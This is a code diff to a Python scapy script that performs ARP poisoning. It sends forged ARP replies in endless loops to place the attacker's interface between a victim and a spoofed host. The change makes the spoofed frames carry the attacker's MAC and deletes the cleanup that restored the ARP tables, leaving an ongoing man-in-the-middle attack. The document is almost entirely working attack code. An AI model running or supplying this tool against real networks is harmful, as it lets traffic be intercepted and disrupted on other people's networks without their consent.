@@ -2,19 +2,27 @@
 
 from multiprocessing import Process
 from scapy.all import Ether, ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, sendp, sniff
-import time
 import sys
 import os
 
 
-def poison(iface, target_ip, target_mac, source_ip):
-    packet = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
+def poison(iface, iface_mac, target_ip, target_mac, source_ip):
+    packet = Ether() / ARP()
+    packet[Ether].src = iface_mac
+    packet[ARP].hwsrc = iface_mac
+    packet[ARP].psrc = source_ip
+    packet[ARP].hwdst = target_mac
+    packet[ARP].pdst = target_ip
     sendp(packet, iface=iface, inter=1, loop=1)
 
 
-def heal(iface, target_ip, target_mac, source_ip, source_mac):
-    packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac,
-                 pdst=target_ip, hwdst=target_mac)
+def heal(iface, iface_mac, target_ip, target_mac, source_ip, source_mac):
+    packet = Ether() / ARP()
+    packet[Ether].src = iface_mac
+    packet[ARP].hwsrc = source_mac
+    packet[ARP].psrc = source_ip
+    packet[ARP].hwdst = target_mac
+    packet[ARP].pdst = target_ip
     sendp(packet, iface=iface)
 
 
@@ -36,16 +44,11 @@ if __name__ == "__main__":
     attacker_mac = get_if_hwaddr(attacker_iface)
 
     def poison_victim():
-        poison(attacker_iface, victim_ip, victim_mac, spoof_ip)
+        poison(attacker_iface, attacker_mac, victim_ip, victim_mac, spoof_ip)
 
     def poison_spoof():
-        poison(attacker_iface, spoof_ip, spoof_mac, victim_ip)
+        poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)
 
-    try:
-        print("Poisoning ARP table...")
-        Process(target=poison_victim).start()
-        Process(target=poison_spoof).start()
-    except:
-        print("Healing ARP table...")
-        heal(victim_ip, victim_mac, spoof_ip, spoof_mac)
-        heal(spoof_ip, spoof_mac, victim_ip, victim_mac)
+    print("Poisoning ARP table...")
+    Process(target=poison_victim).start()
+    Process(target=poison_spoof).start()
